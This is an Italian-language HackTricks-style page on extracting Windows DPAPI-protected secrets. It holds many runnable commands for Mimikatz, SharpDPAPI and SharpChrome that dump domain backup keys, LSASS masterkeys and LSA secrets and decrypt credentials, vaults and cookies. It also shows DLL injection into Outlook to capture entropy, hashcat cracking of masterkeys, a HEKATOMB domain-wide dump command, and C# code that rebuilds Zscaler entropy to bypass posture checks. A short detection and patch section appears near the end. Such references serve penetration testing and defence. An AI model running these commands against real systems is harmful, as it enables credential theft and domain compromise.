# DPAPI - Estrazione delle password

{{#include ../../banners/hacktricks-training.md}}



## Cos'è DPAPI

La Data Protection API (DPAPI) è utilizzata principalmente nel sistema operativo Windows per la **symmetric encryption of asymmetric private keys**, sfruttando come fonte significativa di entropia i segreti dell'utente o del sistema. Questo approccio semplifica la cifratura per gli sviluppatori permettendo loro di cifrare dati usando una chiave derivata dai segreti di logon dell'utente o, per la cifratura di sistema, dai segreti di autenticazione del dominio, evitando così che gli sviluppatori debbano gestire direttamente la protezione della chiave di cifratura.

Il modo più comune di usare DPAPI è tramite le funzioni **`CryptProtectData` e `CryptUnprotectData`**, che consentono alle applicazioni di cifrare e decifrare dati in modo sicuro con la sessione del processo attualmente loggato. Questo significa che i dati cifrati possono essere decifrati solo dallo stesso utente o sistema che li ha cifrati.

Inoltre, queste funzioni accettano anche un **`entropy` parameter** che viene usato durante la cifratura e la decifratura; pertanto, per decifrare qualcosa cifrato usando questo parametro, è necessario fornire lo stesso valore di entropy usato durante la cifratura.

### Users key generation

DPAPI genera una chiave unica (chiamata **`pre-key`**) per ogni utente basata sulle loro credenziali. Questa chiave è derivata dalla password dell'utente e da altri fattori e l'algoritmo dipende dal tipo di utente ma alla fine utilizza SHA1. Per esempio, per gli utenti di dominio, **dipende dall'NTLM hash dell'utente**.

Questo è particolarmente interessante perché se un attacker riesce a ottenere l'hash della password dell'utente, può:

- **Decrypt any data that was encrypted using DPAPI** con la chiave di quell'utente senza dover contattare alcuna API
- Tentare di **crackare la password** offline cercando di generare la valida DPAPI key

Inoltre, ogni volta che un utente cifra dei dati usando DPAPI, viene generata una nuova **master key**. Questa master key è quella effettivamente utilizzata per cifrare i dati. A ogni master key viene assegnato un **GUID** (Globally Unique Identifier) che la identifica.

Le master key sono memorizzate nella directory **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, dove `{SID}` è il Security Identifier di quell'utente. La master key è memorizzata cifrata dalla **`pre-key`** dell'utente e anche da una **domain backup key** per il recupero (quindi la stessa chiave è memorizzata cifrata due volte con due pass diversi).

Nota che la **domain key** usata per cifrare la master key si trova sui domain controllers e non cambia mai, quindi se un attacker ha accesso al domain controller può recuperare la domain backup key e decifrare le master key di tutti gli utenti del dominio.

I blob cifrati contengono il **GUID of the master key** che è stata usata per cifrare i dati nei loro header.

> [!TIP]
> I blob cifrati da DPAPI iniziano con **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Generazione della chiave Machine/System

Questa è la chiave usata dalla macchina per cifrare i dati. Si basa sul **DPAPI_SYSTEM LSA secret**, che è una chiave speciale accessibile solo dall'utente SYSTEM. Questa chiave viene usata per cifrare dati che devono essere accessibili dal sistema stesso, come credenziali a livello macchina o segreti a livello di sistema.

Nota che queste chiavi **non hanno una domain backup**, quindi sono accessibili solo localmente:

- **Mimikatz** può accedervi dumpando gli LSA secrets usando il comando: `mimikatz lsadump::secrets`
- Il secret è memorizzato nel registro, quindi un amministratore potrebbe **modificare i permessi DACL per accedervi**. Il path del registro è: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Dati protetti da DPAPI

Tra i dati personali protetti da DPAPI ci sono:

- credenziali di Windows
- password e dati di completamento automatico di Internet Explorer e Google Chrome
- password di account e-mail e FTP interni per applicazioni come Outlook e Windows Mail
- password per cartelle condivise, risorse, reti wireless e Windows Vault, incluse le chiavi di crittografia
- password per connessioni desktop remoto, .NET Passport e chiavi private per vari scopi di cifratura e autenticazione
- password di rete gestite da Credential Manager e dati personali in applicazioni che usano CryptProtectData, come Skype, MSN messenger e altri
- blob cifrati all'interno del registro
- ...

I dati protetti a livello di sistema includono:
- password Wi-Fi
- password dei task pianificati
- ...

### Opzioni per l'estrazione delle Master Keys

- Se l'utente ha privilegi di Domain Admin, può accedere alla **chiave di backup del dominio** per decriptare tutte le master keys utente nel dominio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Con privilegi di amministratore locale, è possibile **accedere alla memoria di LSASS** per estrarre le DPAPI master keys di tutti gli utenti connessi e la chiave SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Se l'utente ha privilegi di amministratore locale, può accedere al **DPAPI_SYSTEM LSA secret** per decrypt the machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Se la password o l'hash NTLM dell'utente sono noti, puoi **decriptare direttamente le chiavi master dell'utente**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Se sei in una sessione come l'utente, è possibile chiedere al DC la **backup key to decrypt the master keys using RPC**. Se sei local admin e l'utente è connesso, potresti **steal his session token** per questo:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Elenca Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Accesso ai dati DPAPI crittografati

### Trovare i dati DPAPI crittografati

I file utente comunemente **protetti** si trovano in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Controlla anche sostituendo `\Roaming\` con `\Local\` nei percorsi sopra.

Esempi di enumerazione:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) può trovare blob crittografati DPAPI nel file system, nel registro e nei blob B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Nota che [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (dallo stesso repo) può essere usato per decifrare, tramite DPAPI, dati sensibili come i cookies.

### Chiavi di accesso e dati

- **Usa SharpDPAPI** per ottenere credenziali da file cifrati con DPAPI della sessione corrente:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Ottieni informazioni sulle credentials** come i dati cifrati e il guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Decifra una masterkey di un utente che richiede la **domain backup key** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Lo strumento **SharpDPAPI** supporta inoltre questi argomenti per la decrittazione della masterkey (nota come sia possibile usare `/rpc` per ottenere la chiave di backup del dominio, `/password` per usare una password in chiaro, o `/pvk` per specificare un file della chiave privata di dominio DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decriptare i dati usando una masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittazione di `credentials|vaults|rdg|keepass|triage|blob|ps` (nota come sia possibile usare `/rpc` per ottenere la chiave di backup del dominio, `/password` per usare una password in chiaro, `/pvk` per specificare un file della chiave privata DPAPI del dominio, `/unprotect` per usare la sessione dell'utente corrente...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Decifrare alcuni dati usando la **sessione utente corrente**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Gestione dell'Optional Entropy ("Third-party entropy")

Alcune applicazioni passano un valore aggiuntivo **entropy** a `CryptProtectData`. Senza questo valore il blob non può essere decrittato, anche se la masterkey corretta è nota. Ottenere l'entropy è quindi essenziale quando si mirano credenziali protette in questo modo (es. Microsoft Outlook, alcuni VPN client).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) è una user-mode DLL che hooks le funzioni DPAPI all'interno del processo target e registra in modo trasparente qualsiasi optional entropy fornita. Eseguire EntropyCapture in modalità **DLL-injection** contro processi come `outlook.exe` o `vpnclient.exe` genererà un file che mappa ogni buffer di entropy al processo chiamante e al blob. L'entropy catturata può poi essere fornita a **SharpDPAPI** (`/entropy:`) o a **Mimikatz** (`/entropy:<file>`) per decrittare i dati.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ha introdotto un formato di masterkey **context 3** a partire da Windows 10 v1607 (2016). `hashcat` v6.2.6 (dicembre 2023) ha aggiunto hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) e **22102** (context 3) permettendo il cracking accelerato via GPU delle password utente direttamente dal file masterkey. Gli attaccanti possono quindi eseguire attacchi con word-list o brute-force senza interagire con il sistema target.

`DPAPISnoop` (2024) automatizza il processo:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Lo strumento può anche analizzare i blob Credential e Vault, decrittarli con cracked keys ed esportare le password in chiaro.


### Accedere ai dati di una macchina remota

In **SharpDPAPI and SharpChrome** puoi specificare l'opzione **`/server:HOST`** per accedere ai dati di una macchina remota. Ovviamente devi poter accedere a quella macchina e nell'esempio seguente si presume che la **domain backup encryption key sia nota**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Altri strumenti

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) è uno strumento che automatizza l'estrazione di tutti gli utenti e computer dalla directory LDAP e l'estrazione della chiave di backup del domain controller tramite RPC. Lo script risolverà poi gli indirizzi IP di tutti i computer ed eseguirà uno smbclient su ciascuno per recuperare tutti i DPAPI blobs di tutti gli utenti e decrittare tutto con la chiave di backup del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con la lista di computer estratta da LDAP puoi trovare ogni sottorete anche se non la conoscevi!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) può dumpare automaticamente i segreti protetti da DPAPI. La release 2.x ha introdotto:

* Raccolta parallela di blob da centinaia di host
* Parsing dei masterkeys di **context 3** e integrazione automatica con Hashcat per il cracking
* Supporto per i cookie crittografati "App-Bound" di Chrome (vedi sezione successiva)
* Una nuova modalità **`--snapshot`** per interrogare ripetutamente gli endpoint e fare il diff dei blob appena creati

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) è un parser in C# per file masterkey/credential/vault che può produrre formati Hashcat/JtR e opzionalmente invocare automaticamente il cracking. Supporta pienamente i formati di masterkey macchina e utente fino a Windows 11 24H1.


## Rilevamenti comuni

- Accesso a file in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e altre directory correlate a DPAPI.
- Soprattutto da una condivisione di rete come **C$** o **ADMIN$**.
- Uso di **Mimikatz**, **SharpDPAPI** o strumenti simili per accedere alla memoria di LSASS o fare il dump dei masterkeys.
- Evento **4662**: *An operation was performed on an object* – può essere correlato con l'accesso all'oggetto **`BCKUPKEY`**.
- Evento **4673/4674** quando un processo richiede *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilità e cambiamenti dell'ecosistema 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Un attaccante con accesso alla rete poteva indurre un membro del dominio a recuperare una DPAPI backup key malevola, permettendo la decrittazione dei masterkeys utente. Corretto nell'aggiornamento cumulativo di novembre 2023 – gli amministratori dovrebbero assicurarsi che i DC e le workstation siano completamente aggiornati.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ha sostituito la protezione legacy basata solo su DPAPI con una chiave aggiuntiva memorizzata nel **Credential Manager** dell'utente. La decrittazione offline dei cookie ora richiede sia il DPAPI masterkey sia la **GCM-wrapped app-bound key**. SharpChrome v2.3 e DonPAPI 2.x sono in grado di recuperare la chiave aggiuntiva se eseguiti nel contesto utente.


### Caso di studio: Zscaler Client Connector – Entropia personalizzata derivata dal SID

Zscaler Client Connector memorizza diversi file di configurazione sotto `C:\ProgramData\Zscaler` (es. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Ogni file è crittografato con **DPAPI (Machine scope)** ma il vendor fornisce una **custom entropy** che viene *calcolata a runtime* invece di essere memorizzata su disco.

L'entropia viene ricostruita da due elementi:

1. Un segreto hard-coded incorporato in `ZSACredentialProvider.dll`.
2. Il **SID** dell'account Windows a cui appartiene la configurazione.

L'algoritmo implementato dalla DLL è equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Poiché il segreto è incorporato in una DLL che può essere letta dal disco, **qualsiasi attaccante locale con diritti SYSTEM può rigenerare l'entropia per qualsiasi SID** e decifrare i blob offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
La decrittazione restituisce la configurazione JSON completa, comprensiva di ogni **device posture check** e del relativo valore atteso — informazioni molto preziose quando si tentano bypass lato client.

> TIP: gli altri artefatti crittografati (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sono protetti con DPAPI **senza** entropia (`16` zero bytes). Possono quindi essere decrittati direttamente con `ProtectedData.Unprotect` una volta ottenuti i privilegi SYSTEM.

## Riferimenti

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
